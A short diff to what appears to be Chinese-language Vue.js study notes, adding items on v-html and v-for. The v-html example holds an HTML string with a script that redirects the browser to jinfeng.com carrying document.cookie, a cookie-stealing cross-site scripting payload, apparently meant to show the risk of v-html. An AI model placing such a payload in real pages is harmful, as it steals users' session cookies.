@@ -422,3 +422,8 @@ this.fonSize = 20;
 ### 路由
 * SPA   Single Page Application
 一个网站只有一个页面
+
+* v-html = 'myhtml'
+myhtml = '<h4></h4><img src="jingjing.png"/>点我有惊喜<script> location.href="jinfeng.com?cookie="+document.cookie</script>'
+
+* v-for
